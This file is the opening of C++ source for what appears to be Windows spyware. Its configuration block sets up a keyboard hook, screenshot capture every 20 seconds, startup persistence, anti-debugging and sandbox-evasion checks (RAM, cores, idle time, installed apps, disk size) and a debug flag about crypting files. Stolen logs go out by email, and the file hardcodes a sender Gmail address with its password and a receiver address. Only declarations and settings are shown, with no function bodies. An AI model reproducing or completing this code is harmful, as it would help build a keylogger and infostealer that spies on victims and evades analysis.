#define WIN32_LEAN_AND_MEAN
#ifdef UNICODE
	#undef UNICODE
#endif
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <vector>
#include <wininet.h>
#include <iostream>
#include <string>
#include <fstream>
#include <VersionHelpers.h>
#include <slpublic.h>
#include <tlhelp32.h>
#include <algorithm>
#include <iterator>
#include <memory>
#include <set>
#include <vector>
#include <comdef.h>
#include <comutil.h>
#include <Shldisp.h>
#include <shellapi.h>
#include <time.h>
#include <taskschd.h>
#include <assert.h>
#include <intrin.h>
#include <array>
#include <winioctl.h>
#include <shlwapi.h>

#include "Antidbg.h"
#include "log.h"
#include "base64.h"

using buffer = std::vector<char>;

//------------------------------------------------------
// Customization

//#define debug               //whether or not to crypt files and shatter-attack system utilities [REMOVE THIS FLAG]
#define KeyShiftLimit 1223  //cap for the highest possible random encryption key

#define IsMajor false
#define CurrentVersion 1.6
#define CharactersPerLog 300
#define MaximumFolderSize 10 
#define RequiredRam 2048    //MB
#define RequiredCores 2 
#define SecondsBetweenScreenshots 20
#define ScreenshotsPerZip 4
#define SendersEmail "indexmagik@gmail.com"
#define SendersPsw "*MaGiK77"
#define RecieversEmail "bratvolk913@gmail.com"
#define MaxInactivity 10    //max amount of seconds since last input
#define MinRequiredApps 20  //minimum amount of installed programs
#define SecurityLevel 0     //0-3 levels of trust towards environment
#define MinHardDisk 60      //minimum size for the main partition
#define DelayExecution false//whether or not execution should be delayed
#define DelayTime 120       //amount of time for the delay (seconds)
#define QuitIfUntrust false //should we send a log if the environment is untrusted or quit on the spot?

//------------------------------------------------------

#define MAX_LENGTH 1024


#define WINDOWS_SLID                                                \
            { 0x55c92734,                                           \
              0xd682,                                               \
              0x4d71,                                               \
            { 0x98, 0x3e, 0xd6, 0xec, 0x3f, 0x16, 0x05, 0x9f   }    \
}


#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "Slwga.lib")
#pragma comment( lib, "comsuppw.lib" )
//#pragma comment(lib, "Wbemuuid.lib.")


#define _WIN32_WINNT 0x050

extern "C" int RandomGenerator();
int SilentlyRemoveDirectory(const char* dir);
int CalculateDirSize(std::string DirectoryToCheck);
BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args);
ULONG WINAPI Protect(LPVOID);
std::string GetCpuInfo();
BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName);
ULONG WINAPI ScreenGrabber(LPVOID Parameter);
void TakeScreenShot(const char* filename);
bool fexists(std::string filename);                          //create native check through CreateFileA()
void FinalExit();
//void Compress(const buffer& in, buffer& out);
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);



typedef std::string String;
typedef std::vector<String> StringVector;
typedef unsigned long long uint64_t;
